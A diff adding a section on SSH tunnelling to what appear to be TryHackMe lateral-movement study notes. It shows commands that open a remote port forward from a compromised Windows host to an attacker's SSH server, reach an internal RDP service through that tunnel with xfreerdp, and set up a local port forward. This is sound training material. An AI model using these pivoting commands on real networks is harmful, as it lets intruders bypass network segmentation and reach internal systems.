@@ -357,3 +357,38 @@ Note: Windows Server 2019 won't allow you to connect to another user's session w
 We can use port forwarding techniques, which consist of using any compromised host as a jump box to pivot to other hosts.  
 
 ### SSH Tunnelling
+To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.  
+<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/762c622e-741a-4029-be32-2c06784e4f59" width=600>  
+
+```
+useradd tunneluser -m -d /home/tunneluser -s /bin/true
+passwd tunneluser
+```
+
+#### SSH Remote Port Forwarding
+<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/3e7d5be2-b012-47c1-9480-dd08c6256547" width=600>  
+PC1: Command Prompt:  
+```
+C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+```  
+
+`-N`: switch to prevent the client from requesting one, or the connection will exit immediately.  
+`-R`: switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers don't need to match, although they do in this example.  
+
+Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:  
+Attacker's Machine:  
+```
+munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+```
+
+#### SSH Local Port Forwarding  
+Local port forwarding allows us to "pull" a port from an SSH server into the SSH client.  
+<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/b7eff92c-ddd6-4c01-b16c-b97e90178030" width=600>  
+PC1: Command Prompt:  
+```
+C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+```  
+
+`-L` option for local port forwarding
+
+
